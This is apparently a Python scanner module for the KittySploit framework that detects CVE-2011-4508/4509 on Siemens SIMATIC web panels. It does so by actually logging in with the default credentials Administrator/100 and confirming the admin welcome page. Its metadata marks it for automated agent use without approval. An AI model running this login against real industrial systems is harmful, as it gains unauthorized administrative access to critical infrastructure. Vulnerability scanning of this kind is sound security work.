#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Detects CVE-2011-4508/4509 by POSTing Login=Administrator&Password=100 to FormLogin."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Siemens SIMATIC - Default Password Auth Bypass Detection (CVE-2011-4508)',
        'description': (
            'Detects CVE-2011-4508/4509 by POSTing Login=Administrator&Password=100 to FormLogin.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2011', 'siemens', 'simatic', 'auth-bypass', 'ics', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'admin_surface', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2011-4508',
            'https://nvd.nist.gov/vuln/detail/CVE-2011-4509',
        ],
        'cve': 'CVE-2011-4508',
    }

    def run(self):
        for base in ('/', '/www/'):
            start = f'{base}start.html'.replace('//', '/')
            r0 = self.http_request(method='GET', path=start, allow_redirects=False)
            if not r0 or 'miniweb' not in (r0.text or '').lower():
                continue
            login = f'{base}FormLogin'.replace('//', '/')
            r = self.http_request(
                method='POST', path=login,
                data='Login=Administrator&Redirection=%2Fstart.html&Password=100',
                headers={'Content-Type': 'application/x-www-form-urlencoded'},
                allow_redirects=False,
            )
            if not r or 'Auth Form Response' not in (r.text or ''):
                continue
            m = re.search(r'url=([^"]+)', r.text or '')
            cookie = ''
            if r.headers and r.headers.get('Set-Cookie'):
                cookie = r.headers.get('Set-Cookie', '').split(',')[0].strip()
            if not m:
                continue
            r2 = self.http_request(method='GET', path=m.group(1), headers={'Cookie': cookie} if cookie else None, allow_redirects=False)
            body = (r2.text or '') if r2 else ''
            if 'You are logged in' in body and 'Welcome Administrator' in body:
                self.set_info(severity='critical', reason='Siemens SIMATIC default password auth bypass (CVE-2011-4508)', path=login)
                return True
        return False

